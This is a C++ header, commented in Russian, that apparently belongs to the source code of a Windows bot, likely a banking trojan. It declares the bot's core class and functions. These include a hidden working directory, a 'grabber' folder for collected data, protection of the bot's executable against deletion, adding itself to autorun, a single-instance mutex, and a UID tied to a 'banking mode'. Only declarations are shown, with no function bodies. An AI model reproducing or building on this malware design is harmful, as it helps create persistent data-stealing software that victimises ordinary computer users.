//---------------------------------------------------------------------------
//  Основной модуль бота, объеденяющий в себе базовые модули
//---------------------------------------------------------------------------

#ifndef BotCoreH
#define BotCoreH
//---------------------------------------------------------------------------

// подключаем модуль для работы с WINAPI в боте
#include "GetApi.h"

// Модуль для работы с памятью
#include "Memory.h"

// Модуль для работы со строками
#include "Strings.h"

// Модуль шифрования
#include "Crypt.h"

// Базовые настройки бота
#include "Config.h"


// Модуль базовых утилит
#include "Utils.h"

// Модуль для работы с HTTP
#include "BotHTTP.h"


//*****************************************************************************
//  Этот модуль НЕ содержится в общих исходниках
//  Еего должен реализовывать каждый проект
//  Модуль подключает в себе все дополнительные модули
//  меняющие функционал бота
//  Да-же если не планируется использование дополнительных
//  модулей проект всё равно должен включать этот модуль
//*****************************************************************************
#include "Modules.h"







//***********************************************************
//  TBotApplication - класс предоставления доступа к
//                    ключевым моментам бота
//***********************************************************
class TBotApplication : public TBotObject
{
private:
	bool   FTerminated;
	DWORD  FPID;
    string FUID;
	string FApplicationName;
	string FPerfixFileName;
	string FWorkPath;
	string FGrabberPath;

	string MakeWorkPath(bool SystemPath);
	PCHAR  GetWorkFolder(); // Функция возвращает имя рабочей папки бота
public:
	TBotApplication();
	~TBotApplication();

	DWORD  PID();
	string UID();


	string ApplicationName(); // Имя приложения в котором работает бот
	string PrefixFileName();  // Функция возвращает имя файла для хранения префикса
	string WorkPath();        // Путь к рабочему каталогу бота
	string GrabberPath();     // Путь к рабочему каталогу грабера данных

	string MakePath(const char* SubDirectory);   // Функция собирает путь с указанной поддиректорией
	string MakePath(const string &SubDirectory);

	string CreateFile(const char* SubDir, const char* FileName);    // Функция создаёт файл в рабочем катологе бота
	string CreateFile(const string &SubDir, const char* FileName);

	string MakeFileName(const char* SubDir, const char* FileName);  // Функция собирает имя файла в рабочей папке бота
	string MakeFileName(const string &SubDir, const char* FileName);

	bool   FileExists(const char* SubDir, const char* FileName);    // Функция проверяет наличие файла в рабочей папке бота
	bool   FileExists(const string &SubDir, const char* FileName);

	void   SaveSettings();    // Функция сохраняет базовые настройки
	void   DeleteSettings();  // Функция удаляет ранее сохранённые настройки
	bool   Terminated();
};




//*****************************************************************************
//  Bot - Методы для организации работы ядра бота
//*****************************************************************************
namespace BOT
{
	//----------------------------------------------------
	//  Initialize - Функция инициализирует глобальные
	//				 настройки бота
	//----------------------------------------------------
    void Initialize();


	//----------------------------------------------------
	// Функция возвращает рабочий каталог бота
	//
	// SubDir - подкатолог, который будет добавлен к
	//          полученному результату.
	//          НЕ должен начинаться со слеша, но ДОЛЖЕН
	//			им заканчиваться
	//
	// FileName - Имя файла, которое будет добавлено к
	//			  полученному каталогу
	//----------------------------------------------------
	PCHAR GetWorkPath(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkPathInSysDrive - Аналог функции GetWorkPath.
	//  	Главное от личие от нёэ в том, что пусть
	//      создаётся в корне системного диска
	//----------------------------------------------------
	PCHAR GetWorkPathInSysDrive(PCHAR SubDir = NULL, PCHAR FileName = NULL);

	//----------------------------------------------------
	//  GetWorkFolderHash - Функция возвращает хэш
	//  	                   имени рабочей папки
	//----------------------------------------------------
	DWORD GetWorkFolderHash();

	//----------------------------------------------------
	//  GetBotFileName - Функция возвращает имя файла бота
	//----------------------------------------------------
	PCHAR GetBotExeName();

	//----------------------------------------------------
	//  GetBotExeNameHash - Функция возвращает хэш имя
	//						файла бота
	//----------------------------------------------------
    DWORD GetBotExeNameHash();

	//----------------------------------------------------
	//  GetBotFullExeName - Функция возвращает полное имя
	//						файла бота
	//----------------------------------------------------
	PCHAR GetBotFullExeName();

	//----------------------------------------------------
	// Функция защищает ехе бота от удаления
	//----------------------------------------------------
	void Protect(PCHAR FileName);

	//----------------------------------------------------
	// Функция снимает защиту с ехе файла бота
	//----------------------------------------------------
	void Unprotect();

	//----------------------------------------------------
	// AddToAutoRun - Функция добавляет бот в автозагрузку
	//----------------------------------------------------
	bool AddToAutoRun(PCHAR FileName);

	//----------------------------------------------------
	//  BotExeMD5 - Функция возвращает MD5 хэш ехе бота
	//----------------------------------------------------
    string BotExeMD5();

	//----------------------------------------------------
	//  TryCreatBotInstance - функция возвращает 
	//  хендл мьютекса, не нулевое значение которого
	//  означает что этот экземпляр запущен первым.
	//----------------------------------------------------
	HANDLE TryCreateBotInstance();

	//----------------------------------------------------
	//  IsRunning - Функция возвращает истину если в
	//  системе уже запущен экземпляр бота
	//----------------------------------------------------
	bool IsRunning();
}

//уид бота, инициализируется в функции BOT::Initialize(), также меняется если будет изменен префикс 
//через функцию SetBankingMode()
extern char BOT_UID[128];



//===================================================
//    Глобальный класс приложения бота
//===================================================

extern TBotApplication* Bot;


//---------------------------------------------------------------------------
#endif
